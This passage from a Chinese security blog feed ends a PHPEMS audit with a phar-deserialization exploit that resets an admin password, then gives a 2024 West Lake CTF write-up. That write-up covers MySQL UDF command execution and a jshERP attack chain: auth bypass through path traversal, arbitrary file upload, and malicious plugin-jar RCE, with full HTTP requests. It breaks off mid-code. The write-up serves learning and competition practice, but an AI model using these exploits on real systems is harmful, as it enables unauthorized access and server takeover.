 <br>            <span class="hljs-variable language_">$this</span>-&gt;tablepre = <span class="hljs-string">&#x27;x2_user set userpassword=&quot;e10adc3949ba59abbe56e057f20f883e&quot; where username=&quot;peadmin&quot;;#--&#x27;</span>;  <br>            <span class="hljs-variable language_">$this</span>-&gt;db=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">pepdo</span>();  <br>        &#125;  <br>    &#125;  <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pepdo</span>  </span><br><span class="hljs-class"></span>&#123;  <br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$linkid</span> = <span class="hljs-number">0</span>;  <br>    &#125;  <br>&#125;  <br><span class="hljs-keyword">namespace</span> &#123;  <br>    $<span class="hljs-title class_">o</span> = <span class="hljs-title class_">new</span> \<span class="hljs-title class_">PHPEMS</span>\<span class="hljs-title class_">session</span>();  <br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;111.phar&#x27;</span>;<span class="hljs-comment">// 后缀必须为phar，否则程序无法运行  </span><br>    <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) ? <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>) : <span class="hljs-literal">null</span>;  <br>    <span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-variable">$filename</span>);  <br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();  <br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);  <br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);  <br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;foo.txt&quot;</span>,<span class="hljs-string">&quot;bar&quot;</span>);  <br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();  <br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;copy 111.phar 111.gif&#x27;</span>);  <br>&#125;  <br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>‍</p><p>然后进到后台管理拿到第二个flag</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803232.png" alt="image">​</p><p>其实有个RCE，不过参考下文章吧，我就没去看那个了</p><p>‍</p><p>‍</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>整体上这个CMS还是非常值得去复现学习的，因为他的框架稍乱，引用也难受，但也是一种挑战了，真强啊这些师傅</p><p>‍</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mp.weixin.qq.com/s/P7akQHPp4saCl16E0Kw4tA">https://mp.weixin.qq.com/s/P7akQHPp4saCl16E0Kw4tA</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF - 2024 西湖论剑</title>
    <link href="/post/ctf-2024-west-lake-discuss-sword-z10dq7t.html"/>
    <url>/post/ctf-2024-west-lake-discuss-sword-z10dq7t.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>‍看来现在CTF中直接不出PHP了吗？要出就是出顶级难度的了，我咧个豆，西湖论剑队友通天带我了，真有点猛，复现Java的过程当中还是学到不少东西的，希望下次能够自己独立完成出来吧</p><p>‍</p><h1 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h1><p>‍</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>‍</p><h3 id="only-sql"><a href="#only-sql" class="headerlink" title="only_sql"></a>only_sql</h3><p>‍</p><p>一看可以连恶意mysql读文件</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020181.png" alt="image">​</p><p>可以读到源码，格式化后如下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020524.png" alt="image">​</p><p>存在注释的密码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">//mine\n<br>//$db_host=\&#x27;127.0.0.1\&#x27;;\n<br>//$db_username=\&#x27;root\&#x27;;\n<br>//$db_password=\&#x27;1q2w3e4r5t!@#\&#x27;;\n<br>//$db_name=\&#x27;mysql\&#x27;;\n\n<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><p>则可以直接连接进行操作，发现慢日志没办法提示给了<code>LOAD DATA</code>​尝试写文件发现写不进去于是尝试UDF提权</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020681.png" alt="9159353c62f674503b0edfb9f6f335f">​</p><p>先读取插件存在的位置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;plugin_dir&#x27;</span>;<br></code></pre></td></tr></table></figure><p>得到插件目录为<code>/usr/lib/mysql/p1ugin</code>​</p><p>然后进行UDF恶意文件加载(注意是<code>so</code>​)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-number">0x7f454c4</span>...  <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">&#x27;/usr/lib/mysql/p1ugin/udfa.so&#x27;</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func <span class="hljs-keyword">where</span> name <span class="hljs-operator">=</span> &quot;sys_exec&quot;; # 查看<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> string soname &quot;udfa.so&quot;;# 创建函数绑定dll<br><span class="hljs-keyword">select</span> sys_eval(&quot;whoami&quot;);# 调用函数进行命令执行<br></code></pre></td></tr></table></figure><p>‍</p><p>然后查看当前环境变量出flag(我真找了两个小时的flag和提权的方式我真的受不了了)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">POST <span class="hljs-operator">/</span>query.php HTTP<span class="hljs-operator">/</span><span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">1.14</span><span class="hljs-number">.108</span><span class="hljs-number">.193</span>:<span class="hljs-number">31358</span><br>Content<span class="hljs-operator">-</span>Length: <span class="hljs-number">31</span><br>Cache<span class="hljs-operator">-</span>Control: max<span class="hljs-operator">-</span>age<span class="hljs-operator">=</span><span class="hljs-number">0</span><br>Upgrade<span class="hljs-operator">-</span>Insecure<span class="hljs-operator">-</span>Requests: <span class="hljs-number">1</span><br>Origin: http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">1.14</span><span class="hljs-number">.108</span><span class="hljs-number">.193</span>:<span class="hljs-number">31358</span><br>Content<span class="hljs-operator">-</span>Type: application<span class="hljs-operator">/</span>x<span class="hljs-operator">-</span>www<span class="hljs-operator">-</span>form<span class="hljs-operator">-</span>urlencoded<br><span class="hljs-keyword">User</span><span class="hljs-operator">-</span>Agent: Mozilla<span class="hljs-operator">/</span><span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-operator">/</span><span class="hljs-number">537.36</span> (KHTML, <span class="hljs-keyword">like</span> Gecko) Chrome<span class="hljs-operator">/</span><span class="hljs-number">115.0</span><span class="hljs-number">.5790</span><span class="hljs-number">.171</span> Safari<span class="hljs-operator">/</span><span class="hljs-number">537.36</span><br>Accept: text<span class="hljs-operator">/</span>html,application<span class="hljs-operator">/</span>xhtml<span class="hljs-operator">+</span>xml,application<span class="hljs-operator">/</span>xml;q<span class="hljs-operator">=</span><span class="hljs-number">0.9</span>,image<span class="hljs-operator">/</span>avif,image<span class="hljs-operator">/</span>webp,image<span class="hljs-operator">/</span>apng,<span class="hljs-operator">*</span><span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="hljs-comment">Referer: http://1.14.108.193:31358/query.php</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment">Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1706580382; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1706580914; PHPSESSID=cucaobemah665l6748uoeifqvo</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">db_command=select%20sys_eval(%22env%22)%3B</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020822.png" alt="image">​</p><p>‍</p><h3 id="EZerp"><a href="#EZerp" class="headerlink" title="EZerp"></a>EZerp</h3><p>‍</p><p>这个题先放出之前审的ERP的文章，因为这个题是考ERP的，之前审过，但并不是最新版的，审的是2.3的版本，而最新的3.1版本的改了蛮多功能点的，所以这个题我觉得出的还是不错的，让我再次回顾了下关于ERP的内容吧</p><p>‍</p><h4 id="Java审计-华夏ERP"><a href="#Java审计-华夏ERP" class="headerlink" title="Java审计 - 华夏ERP"></a>Java审计 - 华夏ERP</h4><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>系统就存在一个 <code>fliter</code>​ 在 <code>LogCostFilter</code>​ 里面会检查 <code>session</code>​ 来判断用户是否登录，如果没有登录就会让他重定向到 <code>login.html</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020979.png" alt="image">​</p><p>‍</p><h5 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h5><p>‍</p><h6 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h6><p>可以发现这个拦截器是根据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> servletRequest.getRequestURI();<br></code></pre></td></tr></table></figure><p>获取的内容来进行判断的，然后根据获取到的<code>requestUrl</code>​来进行是否进行拦截，并且并不是检索最后，而是使用了<code>contains()</code>​方法，又因为<code>getRequestURI()</code>​方法是完全获取URI的，并没有特殊字符的过滤(Java常见权限绕过的关键方法了) ，所以可以使用<code>../</code>​来进行权限绕过</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020407.png" alt="image">​</p><p>‍</p><p>正常管理员操作查询商品信息，这里删掉Cookie后被拦截器返回到<code>login.html</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020567.png" alt="image">​</p><p>在访问的路径中加入<code>login.html/../</code>​发现正常请求了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021026539.png"></p><p>这个看了一下其他版本的都是通病吧，只要是用的是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> servletRequest.getRequestURI();<br></code></pre></td></tr></table></figure><p>后续在西湖论剑的CTF当中就是个明显例子</p><p>‍</p><p>这里也提一下吧，踩坑记录了属实是，主要是在本地vue起不来前端(难受得一)，所以用权限绕过的方式来获取admin的token来进行后端的操作，可以先获取admin的账号密码(默认admin&#x2F;123456)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /jshERP-boot/user/login HTTP/1.1<br>Host: 10.33.232.182:9999<br>Accept: application/json, text/javascript, */*; q=0.01<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Content-Type: application/json<br>Content-Length: 57<br>Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1706798797; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1706809824; JSESSIONID=BE0AA125744B2BF49540A1BE0FC541EB<br>Origin: http://10.33.232.182:8080<br>Referer: http://10.33.232.182:8080/login.html<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36<br>X-Requested-With: XMLHttpRequest<br><br>&#123;&quot;loginName&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;e10adc3949ba59abbe56e057f20f883e&quot;&#125;<br></code></pre></td></tr></table></figure><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020924.png" alt="image">​</p><p>获取到token后把token的值加入<code>X-Access-Token</code>​ 这个header中即可以管理员权限来操作了</p><p><code>X-Access-Token: 4ef85bce98444cefa6eae9e9d67cbeb5_0</code>​</p><p>‍</p><h6 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h6><p>由于华夏ERP使用的是mybatis，所以直接在对应的mapper文件中搜索<code>$&#123;</code>​即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.7.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020082.png" alt="image">​</p><p>这可太多了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020256.png" alt="image">​</p><p>通过接口层 实现层 控制层，最后找到<code>/Users/zjacky/Documents/Java_project/jshERP-2.3/src/main/java/com/jsh/erp/controller/ResourceController.java </code>​</p><p>在这个控制器中发现sql传入的点是可控的</p><p>‍</p><h6 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h6><p>由于权限绕过了直接全局搜索<code>upload</code>​</p><p>存在两个上传点</p><p>‍</p><ol><li><code>\jshERP-3.1\jshERP-boot\src\main\java\com\jsh\erp\controller\SystemConfigController.java</code>​</li><li><code>\jshERP-3.1\jshERP-boot\src\main\java\com\jsh\erp\controller\PluginController.java</code>​</li></ol><p>‍</p><p>第二个上传点在后续RCE说，这里直接看<code>SystemConfig</code>​的上传</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020414.png" alt="image">​</p><p>发现是任意文件上传，并且接收<code>biz</code>​参数传递,然后跟进下<code>uploadLocal</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020567.png" alt="image">​</p><p>发现就是进行文件取名，但是后缀自定义，然后根据传入的<code>biz</code>​的路径进行上传，并且如果不存在目录就立刻创建该目录</p><p>‍</p><p>(这里省略一个小时的环境配置时间—真操蛋)然后终于上传成功了，一个完美的可以跨越任意目录的任意文件上传</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020736.png" alt="image">​</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /jshERP-boot/doc.html/../systemConfig/upload?biz=../../../../../../ HTTP/1.1<br>Host: 10.33.232.182:9999<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cache-Control: max-age=0<br>X-Access-Token: d22cf07e24434e33a82e43a85be5b0bb_151076<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycrlhXpR4I81QZz0x<br>Origin: http://10.33.232.182<br>Referer: http://10.33.232.182//upload/upload.html<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36<br>Content-Length: 652010<br><br>------WebKitFormBoundarycrlhXpR4I81QZz0x<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.jpg&quot;<br>Content-Type: image/jpeg<br><br>xxx<br>------WebKitFormBoundarycrlhXpR4I81QZz0x--<br><br></code></pre></td></tr></table></figure><p>‍</p><h6 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h6><p>这个点就有点意思了，在<code>\jshERP-3.1\jshERP-boot\src\main\java\com\jsh\erp\controller\PluginController.java</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020894.png" alt="image">​</p><p>用户可以上传一个符合格式的<code>jar</code>​包到这个接口，这里就会通过 <code>uploadPluginAndStart</code>​ 上传加载依赖</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020051.png" alt="image">​</p><p>那么如果说我们能够传入恶意的<code>jar</code>​是不是就可以进行RCE了呢，那么现在的问题就成了: 如何构造一个恶意的插件是符合上传插件逻辑的</p><p>于是去查找官方文档，找各种资料各种百度各种搜索(这插件也太tmd难写了吧我真无语)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">https://gitee.com/starblues/springboot-plugin-framework-parent<br>https://www.yuque.com/starblues/spring-brick-3.0.0/vxwgye#gLJ40<br>https://gitee.com/starblues/springboot-plugin-framework-example<br></code></pre></td></tr></table></figure><p>找了一个世纪，最后在github上才找到了这篇文章</p><p><a href="https://github.com/thestyleofme/springboot-plugin-framework-parent">https://github.com/thestyleofme/springboot-plugin-framework-parent</a></p><p>‍</p><p>首先第一步，直接maven全编译打包一遍</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mvn clean package -Dmaven.test.skip=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>为什么要整个项目全进行maven解析呢？是因为单个pom.xml解析的话会报这种错误</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020203.png" alt="image">​</p><p>而整个项目编译则没问题，是因为他写的pom.xml这个找不到指定的依赖写在了该项目的别的分支项目的pom.xml中，所以整体打包的话就没有问题了</p><p>‍</p><p>然后找到对应的插件进行修改</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020360.png" alt="image">​</p><p>然后再次maven编译下用jadx去检查下对应的字节码文件发现没有问题打包成功了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020536.png" alt="image">​</p><p>但是这里有三个问题</p><ol><li>仅仅只是加载类，但是并没有初始化，所以是不会执行静态代码的，但是在下面又存在初始化的路由</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 根据插件路径安装插件。该插件jar必须在服务器上存在。注意: 该操作只适用于生产环境</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> path 插件路径名称</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> 操作结果</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@PostMapping(&quot;/installByPath&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">install</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;path&quot;)</span> String path)</span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span>(pluginOperator.install(Paths.get(path)))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;installByPath success&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;installByPath failure&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;installByPath failure : &quot;</span> + e.getMessage();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以我们可以用路径的形式直接去访问我们传好的恶意的jar包</p><p>‍</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /plugin/installByPath HTTP/1.1<br>Host: 10.33.232.182:8080<br>Accept: application/json, text/javascript, */*; q=0.01<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Content-Length: 8<br>Content-Type: application/x-www-form-urlencoded<br>Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1706798797; JSESSIONID=F79B29228D4BD16B61B9C8C87AD9C81D; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1706802472<br>Referer: http://10.33.232.182:8080/index.html<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36<br>X-Requested-With: XMLHttpRequest<br><br>path=Y:\\151076\\basic-example-plugin2-1.0.7.RELEASE.jar<br></code></pre></td></tr></table></figure><p>但是他会提示<code>Plugin id can&#39;t be empty</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020688.png" alt="image">​</p><p>‍</p><ol start="2"><li>修改<code>MANIFEST.MF</code>​(当然也可以直接用本项目生成好的<code>-with-dependencies.jar</code>​)</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">Plugin-Id: basic-example-plugin3<br>Implementation-Version: 1.0.8.RELEASE<br>Plugin-Provider: isaacc<br>Plugin-Version: 1.0.8.RELEASE<br>Plugin-Class: com.basic.example.plugin2.DefinePlugin<br></code></pre></td></tr></table></figure><ol start="3"><li>要注意的点就是他一定要创建<code>plugins</code>​目录(系统之前已经安装过插件) 才能够将我们传入的jar部署上去</li></ol><p>‍</p><p>满足上述三点 再去初始化发现就加载进去然后弹出计算机了</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020857.png" alt="image">​</p><p>‍</p><h4 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h4><p>‍</p><p>先看提示</p><p>ezerp</p><p>hint1: plugins目录不存在</p><p>hint2: 附件新增一个 <a href="https://xjlh2024-1308232561.cos.ap-nanjing.myqcloud.com/WEB-ezerp.jar">https://xjlh2024-1308232561.cos.ap-nanjing.myqcloud.com/WEB-ezerp.jar</a></p><p>‍</p><p>首先前面是弱口令admin&#x2F;123456可以进入后台的(所以虽然有权限绕过但是也可以不用)，所以直接看后台的洞即可，找了自己审计的文章和网上最新版本公开的漏洞来对比分析，发现是存在任意文件上传的，但是并不知道web路径而且应该知道这个ERP是不解析jsp的，根据提示说plugins目录不存在,那么就可以通过上传去建立这个文件夹，然后通过上传Jar包来进行依赖的添加来导致RCE</p><p>‍</p><h5 id="权限绕过-但是好像不知道为啥突然弱口令就没了"><a href="#权限绕过-但是好像不知道为啥突然弱口令就没了" class="headerlink" title="权限绕过(但是好像不知道为啥突然弱口令就没了)"></a>权限绕过(但是好像不知道为啥突然弱口令就没了)</h5><p>跟上述讲的一样，看他的拦截器如下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020373.png" alt="image">​</p><p>所以只需要带有<code>/user/login/../</code>​即可成功绕过权限了</p><p>什么都不加</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020530.png" alt="image">​</p><p>加了<code>/user/login/../../</code>​后直接返回200</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020705.png" alt="image">​</p><p>获取管理员的token</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020857.png" alt="image">​​</p><h5 id="文件上传新建文件夹"><a href="#文件上传新建文件夹" class="headerlink" title="文件上传新建文件夹"></a>文件上传新建文件夹</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://1.14.108.193:32014/user/login/../../jshERP-boot/systemConfig/upload?biz=../../../../../../../../../../../../opt/plugins<br></code></pre></td></tr></table></figure><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020015.png" alt="image">​</p><h5 id="直接去install我们上传的jar包"><a href="#直接去install我们上传的jar包" class="headerlink" title="直接去install我们上传的jar包"></a>直接去install我们上传的jar包</h5><p>偷个图</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020160.png!thumbnail">​</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="2024签到题"><a href="#2024签到题" class="headerlink" title="2024签到题"></a>2024签到题</h3><p>‍</p><p>下载下来看图片详情发暗号即可</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020348.png" alt="image">​</p><p>‍</p><p>‍</p><h3 id="数据安全-easy-tables"><a href="#数据安全-easy-tables" class="headerlink" title="数据安全-easy_tables"></a>数据安全-easy_tables</h3><p>‍</p><p>‍为了方便操作，将csv文件转化为json文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><br><span class="hljs-comment"># 读取CSV文件</span><br>df = pd.read_csv(<span class="hljs-string">&#x27;tables.csv&#x27;</span>)<br><span class="hljs-comment"># 将数据转换为JSON格式</span><br>json_data = df.to_json(<span class="hljs-string">&#x27;tables..json&#x27;</span>, orient=<span class="hljs-string">&#x27;records&#x27;</span>)<br><span class="hljs-comment"># 读取CSV文件</span><br>df = pd.read_csv(<span class="hljs-string">&#x27;permissions.csv&#x27;</span>)<br><span class="hljs-comment"># 将数据转换为JSON格式</span><br>json_data = df.to_json(<span class="hljs-string">&#x27;permissions.json&#x27;</span>, orient=<span class="hljs-string">&#x27;records&#x27;</span>)<br><br><span class="hljs-comment"># 